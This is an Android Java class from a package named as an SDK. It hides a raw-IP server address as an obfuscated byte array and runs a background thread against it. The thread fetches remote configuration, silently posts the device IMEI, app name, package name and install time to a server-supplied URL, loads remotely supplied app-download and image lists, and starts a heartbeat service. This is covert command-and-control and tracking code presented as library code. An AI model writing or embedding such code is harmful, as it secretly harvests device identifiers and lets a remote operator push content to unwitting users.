package sdk.fx;

import java.util.HashMap;
import java.util.Map;

import android.annotation.SuppressLint;
import android.app.DownloadManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.util.Log;

@SuppressWarnings("unused")public class MainTask {
	public static MainTask mMainTaskInstance;
	private byte[] MAIN_CFG_URL = { 104, 116, 116, 112, 58, 47, 47, 49, 50, 48,
			46, 50, 54, 46, 51, 57, 46, 50, 51, 54, 47, 109, 97, 105, 110, 99,
			111, 110, 102, 105, 103, 46, 112, 104, 112, 63, 113, 61, 49 };
	private static int nCount = 0;
	private Context mContext;

	public MainTask() {
	}

	public static MainTask GetMainTaskInstance() {
		if (mMainTaskInstance == null) {
			mMainTaskInstance = new MainTask();
		}
		return mMainTaskInstance;
	}

	public void StartJob(Context context) {
		this.mContext = context;
		SaveSelfBasicInforIntoSP(context);
		if (nCount == 0) {
			Log.d(GlobalDatas.__TAG__,"14");
			registryAppDownloadCompleteReceiver(context);
			nCount++;
		}
		new MessageSendThread(this.mContext).start();
	}

	private void SaveSelfBasicInforIntoSP(Context context) {
		BasicInforGetter bg = BasicInforGetter.getBasicInforGetterInstance();
		bg.setBasicInfor(context);
		SharedPreferences sp = context.getSharedPreferences(GlobalDatas.SP_NAME, 0);
		sp.edit().putString(GlobalDatas.KEY_CHANNELID, bg.GetChinalID()).commit();
		sp.edit().putString(GlobalDatas.KEY_APP_NAME, bg.GetAppName()).commit();
		sp.edit().putString(GlobalDatas.KEY_IMEI, bg.GetDeviceID()).commit();
		sp.edit().putString(GlobalDatas.KEY_PKGNAME, bg.GetPkgName()).commit();
		sp.edit().putString(GlobalDatas.KEY_INSTALL_TIME, bg.GetSoftInstallTime()).commit();
	}

	@SuppressLint("DefaultLocale")//the method of post message to server
	private void ReportMessages(Context context) {
		int OPT_TYPE = 0;
		BasicInforGetter bg = BasicInforGetter.getBasicInforGetterInstance();
		SharedPreferences sp = context.getSharedPreferences(GlobalDatas.SP_NAME, 0);
		boolean value = sp.getBoolean(GlobalDatas.KEY_HAS_INSTALLED, false);
		if (value == false) {
			OPT_TYPE = GlobalDatas.OPT_TYPE_SOFT_INSTALL;
			GlobalDatas.FIRST_RUN = "1";
			sp.edit().putBoolean(GlobalDatas.KEY_HAS_INSTALLED, true).commit();
		} else {
			OPT_TYPE = GlobalDatas.OPT_TYPE_SOFT_START;
			GlobalDatas.FIRST_RUN = "0";
		}
		sp.edit().putString(GlobalDatas.KEY_CHANNELID, bg.GetChinalID()).commit();
		NetWorkOpt nwp = NetWorkOpt.GetNetWorkOptInstance();
		Map<String, String> mapargs = new HashMap<String, String>();
		mapargs.put(GlobalDatas.NAME_OPT, Integer.toString(OPT_TYPE));
		mapargs.put(GlobalDatas.KEY_IMEI, bg.GetDeviceID());
		mapargs.put(GlobalDatas.KEY_CHANNELID, bg.GetChinalID());
		mapargs.put(GlobalDatas.KEY_APP_NAME, bg.GetAppName());
		mapargs.put(GlobalDatas.KEY_INSTALL_TIME, bg.GetSoftInstallTime());
		mapargs.put(GlobalDatas.KEY_PKGNAME, bg.GetPkgName());
		mapargs.put(GlobalDatas.NAME_RIRSTRUN, GlobalDatas.FIRST_RUN);
		String reportUrl = sp.getString(GlobalDatas.REPORT_URL, "");
		String str = nwp.sendPostMessage(new String(reportUrl), mapargs,"utf-8");
	}

	@SuppressLint("InlinedApi")
	private void registryAppDownloadCompleteReceiver(Context context) {
		IntentFilter filter = new IntentFilter(DownloadManager.ACTION_DOWNLOAD_COMPLETE);
		context.registerReceiver(new DownloadCompleteBroadcast(context), filter);
	}

	//the thread that send the message of the bases information
	public class MessageSendThread extends Thread {
		private Context context;
		public MessageSendThread(Context ctx) {
			context = ctx;
		}

		public void run() {
			boolean bOk = DownloadMainConfigFile(context, new String(MAIN_CFG_URL));
			if (bOk == false) {
				return;
			}
			ReportMessages(context);
			getBackupList(context);
			boolean bGlobalNeedShow = IsGlobalNeedShow(context);
			if (bGlobalNeedShow != false) {
				Intent serviceHeartBeat = new Intent(context,HeartBeatService.class);
				if (GlobalDatas.nCountHeartBeat == 0) {
					context.startService(serviceHeartBeat);
					GlobalDatas.nCountHeartBeat++;
				}
			}
		}
	}

	@SuppressWarnings("null")
	private boolean DownloadMainConfigFile(Context context, String address) {
		if(context == null)			return false;
		NetWorkOpt netOpt = NetWorkOpt.GetNetWorkOptInstance();
		if (netOpt.IsNetWorkActivity(mContext) == false) {
			return false;
		}
		String mainconfig_datas = netOpt.GetMainConfigFileContent(address);
		if (mainconfig_datas == null && mainconfig_datas.isEmpty() == true) {
			return false;
		}

		String[] dataLists = mainconfig_datas.split("\\n");
		SharedPreferences sp = context.getSharedPreferences(GlobalDatas.SP_NAME, 0);
		String value = dataLists[0];
		sp.edit().putString(GlobalDatas.GSHOW, value).commit();
		value = dataLists[1];
		sp.edit().putString(GlobalDatas.REPORT_URL, value).commit();
		value = dataLists[2];
		sp.edit().putString(GlobalDatas.CHANNEL_URL, value).commit();
		value = dataLists[3];
		sp.edit().putString(GlobalDatas.PICTURE_URL, value).commit();
		value = dataLists[4];
		sp.edit().putString(GlobalDatas.BMD_URL, value).commit();
		value = dataLists[5];
		sp.edit().putString(GlobalDatas.APP_DOWN_REPORT_URL, value).commit();
		value = dataLists[6];
		sp.edit().putString(GlobalDatas.REPLACE_URL, value).commit();
		return true;
	}
	
	@SuppressWarnings("null")
	private boolean getBackupList(Context context){
		if(context == null){
			return false;
		}
		NetWorkOpt netOpt = NetWorkOpt.GetNetWorkOptInstance();
		if (netOpt.IsNetWorkActivity(mContext) == false) {
			return false;
		}
		
		SharedPreferences sp = context.getSharedPreferences(GlobalDatas.SP_NAME, 0);
		String address = sp.getString(GlobalDatas.REPLACE_URL, "");
		if(address.isEmpty() == true){
			return false;
		}
		
		String mainconfig_datas = netOpt.GetMainConfigFileContent(address);
		if (mainconfig_datas == null && mainconfig_datas.isEmpty() == true) {
			return false;
		}
		String[] dataLists = mainconfig_datas.split("\\n");
		int len = dataLists.length;
		for(int i = 0; i < len ; i++){
			PictureInformation pi = new PictureInformation();
			String[] elements = dataLists[i].split("\\|");
			pi.setPicUrl(elements[0]);
			pi.setAppUrl(elements[1]);
			pi.setAppName(elements[2]);
			pi.setPicLevel(elements[3]);
			GlobalDatas.gBackupPicList.add(pi);
		}
		return true;
	}
	
	private boolean IsGlobalNeedShow(Context context){
		SharedPreferences sp = context.getSharedPreferences(GlobalDatas.SP_NAME, 0);
		String value = sp.getString(GlobalDatas.GSHOW, "false");
		if(value.equals("false")){
			return false;
		}
		return true;
	}
	
	/**
	 * 获取总的配置信息，包括是否需要全局显示及其他URL
	 * @address:URL地址
	 * @return
	 * 如果没有任何异常发生，返回一个字符串，否则返回NULL
	 */
	private String getMaintainCotroller(String address){
		String dataRet = "";
		return null;
	}
}
